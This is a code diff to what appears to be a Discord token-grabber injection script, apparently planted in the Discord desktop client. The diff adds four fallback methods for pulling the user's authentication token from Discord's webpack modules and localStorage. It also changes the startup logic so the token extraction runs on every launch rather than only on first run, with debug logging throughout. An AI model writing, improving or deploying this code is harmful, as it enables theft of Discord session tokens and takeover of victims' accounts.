@@ -116,7 +116,47 @@ const clearAllUserData = () => {
     executeJS("location.reload()");
 };
 
-const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+const getToken = async () => {
+    console.log('DEBUG: Starting token extraction...');
+    try {
+        // Method 1: Try the original webpack method
+        const token1 = await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+        console.log('DEBUG: Method 1 result:', token1 ? 'SUCCESS' : 'FAILED');
+        if (token1) return token1;
+    } catch (e) {
+        console.log('DEBUG: Method 1 error:', e.message);
+    }
+
+    try {
+        // Method 2: Alternative webpack approach
+        const token2 = await executeJS(`Object.values(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken)?.exports?.default?.getToken?.()`);
+        console.log('DEBUG: Method 2 result:', token2 ? 'SUCCESS' : 'FAILED');
+        if (token2) return token2;
+    } catch (e) {
+        console.log('DEBUG: Method 2 error:', e.message);
+    }
+
+    try {
+        // Method 3: Direct localStorage access
+        const token3 = await executeJS(`JSON.parse(localStorage.getItem('token'))`);
+        console.log('DEBUG: Method 3 result:', token3 ? 'SUCCESS' : 'FAILED');
+        if (token3) return token3;
+    } catch (e) {
+        console.log('DEBUG: Method 3 error:', e.message);
+    }
+
+    try {
+        // Method 4: Alternative localStorage
+        const token4 = await executeJS(`Object.values(localStorage).find(v => v?.startsWith?.('"') && v.includes('.'))`);
+        console.log('DEBUG: Method 4 result:', token4 ? 'SUCCESS' : 'FAILED');
+        if (token4) return JSON.parse(token4);
+    } catch (e) {
+        console.log('DEBUG: Method 4 error:', e.message);
+    }
+
+    console.log('DEBUG: All token extraction methods failed');
+    return null;
+};
 
 const request = async (method, url, headers, data) => {
     url = new URL(url);
@@ -493,10 +533,17 @@ async function initiation() {
     console.log('DEBUG: Checking for initiation folder:', path.join(__dirname, 'initiation'));
     console.log('DEBUG: Initiation folder exists:', fs.existsSync(path.join(__dirname, 'initiation')));
     
+    // Always run the injection, regardless of initiation folder
+    let shouldRunInjection = true;
+    
     if (fs.existsSync(path.join(__dirname, 'initiation'))) {
-        console.log('DEBUG: Removing initiation folder and starting token extraction...');
+        console.log('DEBUG: Removing initiation folder (first run)...');
         fs.rmdirSync(path.join(__dirname, 'initiation'));
+    } else {
+        console.log('DEBUG: No initiation folder, but running injection anyway...');
+    }
 
+    if (shouldRunInjection) {
         const token = await getToken();
         console.log('DEBUG: Token extracted:', token ? 'SUCCESS' : 'FAILED');
         console.log('DEBUG: Token length:', token ? token.length : 'N/A');
